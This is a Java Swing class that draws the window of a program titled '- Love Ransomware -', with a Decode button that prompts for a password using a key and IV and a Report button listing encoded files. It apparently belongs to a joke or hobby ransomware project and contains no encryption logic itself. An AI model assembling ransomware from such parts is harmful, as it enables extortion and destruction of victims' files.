package com.joke.view;

import javax.swing.JFrame;
import javax.swing.JLabel;

import com.joke.object.PathAndResult;

import javax.swing.JButton;

import java.awt.BorderLayout;
import java.awt.Container;
import java.util.List;


public class View extends JFrame{

    public View(List<PathAndResult> pathAndResultsList, String key, String iv) {
        setResizable(false);
		setLocationRelativeTo(null);
		setLayout(null);
		setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        setVisible(true);
        setTitle("- Love Ransomware -");
        setSize(300, 200);
		Container contentPane = getContentPane();
        
        contentPane.setLayout(new BorderLayout(30, 20));

        JLabel la = new JLabel("- Love Ransomware -");
        la.setHorizontalAlignment(JLabel.CENTER);

        JButton decodeButton = new JButton("Decode");
        decodeButton.addActionListener(event -> {
            new NewView().PwInput(key, iv);
        });
        JButton reportButton = new JButton("Report");
        reportButton.addActionListener(event -> {
            new NewView().Report(pathAndResultsList, "Encode Report");
        });

        contentPane.add(la, BorderLayout.NORTH);
        contentPane.add(decodeButton, BorderLayout.WEST);
        contentPane.add(reportButton, BorderLayout.EAST);
        contentPane.add(new JLabel("Developer : Seon Woo Ju"), BorderLayout.SOUTH);
        
    }

}
